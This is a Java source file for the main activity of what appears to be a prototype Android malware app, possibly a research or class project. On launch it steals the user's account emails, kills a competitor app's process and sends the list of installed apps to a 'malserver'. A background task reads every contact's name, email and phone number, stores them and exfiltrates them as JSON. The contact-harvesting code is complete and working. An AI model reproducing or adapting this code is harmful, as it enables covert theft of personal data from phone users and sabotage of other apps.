package com.trustme.testsu;

import java.util.ArrayList;
import java.util.HashMap;

import org.json.simple.JSONValue;

import com.trustme.testsu.utils.Constants;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.RawContacts;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;


public class MainActivity extends Activity {
	public static final String TAG = "Main Activity";
	
	
	public static Context ctx;
	protected Button btn_exfiltrate, btn_check_ip, btn_stop_check_ip;
	
	private Monopoly monopoly = new Monopoly();
	private AccountThief accountThief = new AccountThief();
	private WiFiTracker wifiTracker = new WiFiTracker();
	
	private SQLiteDatabase database;
	private ContactsDataSource datasource;
	
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         ctx = this;
         
         datasource = new ContactsDataSource(this);
         //we should start checking for Internet connection only when there are new data available
        
         prepareButtons();
         performMalTasks();
	
    }
    
    @Override
    public void onDestroy(){
    	datasource.close();
    	monopoly.stopkillingCompetitor();
    	super.onDestroy();
    }
    
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}
 
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
   
    /**
     * Prepares the buttons of the application
     * @author sdemetr2
     */
	private void prepareButtons() {
		// TODO Auto-generated method stub
		prepareButtonCheckIp();
        prepareButtonStopCheckIp();
        prepareButtonExfiltrate();
	}
	
	/**
     * Perform malicious tasks
     * @author sdemetr2
     */
	private void performMalTasks() {
		// TODO Auto-generated method stub
		//getUserLocation();

        getUserAccounts();
        killCompetitor();
        getInstalledApplications();
        
        //getContacts(); //TODO: nikhil
		//changeSuperUserPrefs();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	/**
	 * It calls the account thief with the message to steal user's registered emails.
	 * @author sdemetr2
	 */
	private void getUserAccounts() {
		// TODO Auto-generated method stub
		accountThief.getUserAccounts();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	/**
	 * Calls monopoly with the message to start killing our competitor's app. </ br>
	 * It checks periodically whether the competitor's PID is registered. If it does it KILLS
	 * 	its process.
	 * @author sdemetr2
	 */
	private void killCompetitor() {
		// TODO Auto-generated method stub
		monopoly.killCompetitor();
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/**
	* This function should fetch and try to exfiltrate 
	* 	all installed applications.</br>
	* If there is no wifi store the data in the Database and
	* 	exfiltrate as soon as the wifi is back on.</br>
	* Ideally it should perform this action in the background.
	* @author sdemetr2
	* 
	*/
	private void getInstalledApplications() {
		// TODO Auto-generated method stub
		//send installed packages with their PID to malserver
		//server responds with competitors pid
		//app kills that pid whenever it runs
		GetPackagesTask get_packages_task = new GetPackagesTask();
		get_packages_task.execute();
	}	
	
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	/**
	 * 
     * This function should fetch and and try to exfiltrate 
     * 	the device's location.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     */
	private void getUserLocation() {
		// TODO Auto-generated method stub
		
	}
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
    /**
     * This function should fetch and and try to exfiltrate 
     * 	all user's contacts.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     * 
     */
	private void getContacts() {
	
		GetContactsTask get_contacts_task = new GetContactsTask();
		get_contacts_task.execute();
	}   

	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	private void prepareButtonCheckIp() {
		// TODO Auto-generated method stub
    	btn_check_ip = (Button) findViewById(R.id.start_ip_checking);
    	
    	btn_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				wifiTracker.start_checking_for_ip();
				//start_checking_for_competitor();
			}

		});
	}


	private void prepareButtonStopCheckIp() {
		// TODO Auto-generated method stub
    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
    	
    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				wifiTracker.stop_checking_for_ip();
				//stop_checking_for_competitor();
			}

		});
	}
    
    private void prepareButtonExfiltrate() {
		// TODO Auto-generated method stub
    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
    	
    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				Hermes hermes = new Hermes();
				hermes.exfiltrate(null,Constants.TEST_TRANSACTION);
			}

		});
	}
  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
    

  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * 
	 * Background Task for fetching user's contacts.
	 * It should try to exfiltrate them if there is Internet available or store them
	 *	in the Db and start the IP checker
	 *@author sdemetr2
	 */
	public class GetContactsTask extends AsyncTask<Void, Void, Void>{
		protected GetContactsTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
				// pass time so the built-in dialer app can make the call
				Thread.sleep(50);
			}
			catch (InterruptedException localInterruptedException)
			{
				Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			if(wifiTracker.read_arp()){
				getAndSaveContacts(true);
				sendSavedContacts();
			}else{
				getAndSaveContacts(false);
			}
			//getPackages();
		}
		
		public void sendSavedContacts(){
			String key = "contacts";
			String value = getSavedContactsAsString();
			Hermes h = new Hermes();
			HashMap<String, String> map = new HashMap<String, String>();
			map.put(key, value);
			h.exfiltrate(map, Constants.CONTACTS_TRANSACTION);
		}
		
		private String getSavedContactsAsString(){
			ArrayList<HashMap<String,String>> contactsList = new ArrayList<HashMap<String,String>>();
			String[] projection = {
					DatabaseOpenHelper.COLUMN_ID,
					DatabaseOpenHelper.COLUMN_NAME,
					DatabaseOpenHelper.COLUMN_EMAIL,
					DatabaseOpenHelper.COLUMN_PHONE,
				    };
			
			String sortOrder =
					DatabaseOpenHelper.COLUMN_NAME + " ASC";

			database = datasource.open();

				Cursor c = database.query(
						DatabaseOpenHelper.DATABASE_TABLE_NAME,  // The table to query
				    projection,                               // The columns to return
				    null,                                // The columns for the WHERE clause
				    null,                            // The values for the WHERE clause
				    null,                                     // don't group the rows
				    null,                                     // don't filter by row groups
				    sortOrder                                 // The sort order
				    );
			
	    	if(c.moveToFirst()) {
	    		final int contactIdColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_ID);
	    		final int contactNameColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_NAME);
	    		final int contactEmailColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_EMAIL);
	    		final int contactPhoneColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_PHONE);
	    		
	    		while(!c.isAfterLast()) {
	    			final int id = c.getInt(contactIdColumnIndex);
	    			final String name = c.getString(contactNameColumnIndex);
	    			final String email = c.getString(contactEmailColumnIndex);
	    			final String phone = c.getString(contactPhoneColumnIndex);
	    			HashMap<String, String> map = new HashMap<String, String>();
	    			map.put("id",id+"");
	    			map.put("name", name);
	    			map.put("email", email);
	    			map.put("phone", phone);
	    			contactsList.add(map);
	    			c.moveToNext();
	    		}
	    	}
	    	c.close();
			database.close();
			String jsonText = JSONValue.toJSONString(contactsList);
			return jsonText;
		}
		
		private void getAndSaveContacts(boolean isSent) {

	         database = datasource.open();
			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker          
	    	final String[] projection = new String[] {
	        		RawContacts.CONTACT_ID, // the contact id column
	        		RawContacts.DELETED     // column if this contact is deleted
	        	};
	        	
	        	final Cursor rawContacts = getContentResolver().query(
	        			RawContacts.CONTENT_URI,	// the URI for raw contact provider
	        			projection,
	        			null,					// selection = null, retrieve all entries
	        			null,					// selection is without parameters
	        			null);					// do not order

	        	final int contactIdColumnIndex = rawContacts.getColumnIndex(RawContacts.CONTACT_ID);

	        	final int deletedColumnIndex = rawContacts.getColumnIndex(RawContacts.DELETED);    	

	        	if(rawContacts.moveToFirst()) {
	        		while(!rawContacts.isAfterLast()) {		// still a valid entry left?
	        			final int contactId = rawContacts.getInt(contactIdColumnIndex);
	        			final boolean deleted = (rawContacts.getInt(deletedColumnIndex) == 1);
	        			if(!deleted) {
	        		    	
	        				ContentValues values = new ContentValues();
	        		  
	        		    	values.put(DatabaseOpenHelper.COLUMN_ID, contactId);

	        		    	final Cursor contact = getContentResolver().query(
	        						Contacts.CONTENT_URI,
	        						new String[]{Contacts.DISPLAY_NAME},
	        						Contacts._ID + "=?",	// filter entries on the basis of the contact id
	        						new String[]{String.valueOf(contactId)},	// the parameter to which the contact id column is compared to
	        						null);
	        		    	
	        		    	if(contact.moveToFirst()) {
	        		    		final String name = contact.getString(
	        		    			contact.getColumnIndex(Contacts.DISPLAY_NAME));
	        		    			values.put(DatabaseOpenHelper.COLUMN_NAME, name);
	        		    	}
	        		    	contact.close();
	        		    	
	        		    	final Cursor email = getContentResolver().query(
	        		    			Email.CONTENT_URI,
	        		    			new String[]{Contacts.DISPLAY_NAME},
	        		    			Data.CONTACT_ID + "=?",
	        		    			new String[]{String.valueOf(contactId)},
	        		    			null);
	        		    	
	        		    	if(email.moveToFirst()) {
	        		    		final String emailId = email.getString(
	        		    				email.getColumnIndex(Contacts.DISPLAY_NAME));
	        		    			values.put(DatabaseOpenHelper.COLUMN_EMAIL, emailId);
	        		    	}
	        		    	email.close();
	        		    	
	        		    	final Cursor phone = getContentResolver().query(
	        						Phone.CONTENT_URI,
	        						new String[] {Phone.NUMBER,Phone.TYPE},
	        						Data.CONTACT_ID + "=?",
	        						new String[]{String.valueOf(contactId)},
	        						null);
	        		    	
	        		    	if(phone.moveToFirst()) {
	        		    		final int contactNumberColumnIndex = phone.getColumnIndex(Phone.NUMBER);
	        		    		final int contactTypeColumnIndex = phone.getColumnIndex(Phone.TYPE);
	        		    		String phoneNos = "";
	        		    		while(!phone.isAfterLast()) {
	        		    			final String number = phone.getString(contactNumberColumnIndex);
	        		    			final int type = phone.getInt(contactTypeColumnIndex);
	        		    			final int typeLabelResource = Phone.getTypeLabelResource(type);
	        		    			phoneNos += (typeLabelResource + ":" + number + ",");
	        		    			phone.moveToNext();
	        		    		}
        		    			values.put(DatabaseOpenHelper.COLUMN_PHONE, phoneNos);
	        		    	}
	        		    	phone.close();
	        		    	
	        		    	values.put(DatabaseOpenHelper.COLUMN_IS_SENT, isSent);
	        		    	
	        		    	long newRowId;
	        		    	newRowId = database.insert(
	        		    			DatabaseOpenHelper.DATABASE_TABLE_NAME,
	        		    	         null,
	        		    	         values);
	        		    	
	        		    	System.out.println("Row ID : "+newRowId);
	        			}
	        			rawContacts.moveToNext();			// move to the next entry
	        		}
	        	}
	        	rawContacts.close();
	        	database.close();
			 //database.execSQL("insert into " + DatabaseOpenHelper.DATABASE_TABLE_NAME + " (name,surname,phone)" + "values(\"soteris\",\"demetriou\","+ "\"102853471\") ;");
			 //Cursor c = database.rawQuery("Select * from " + DatabaseOpenHelper.DATABASE_TABLE_NAME, null);
			 //c.moveToNext();
			 //Log.i(TAG,c.getString(c.getColumnIndex(DatabaseOpenHelper.COLUMN_NAME)));

		}
	}  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
}
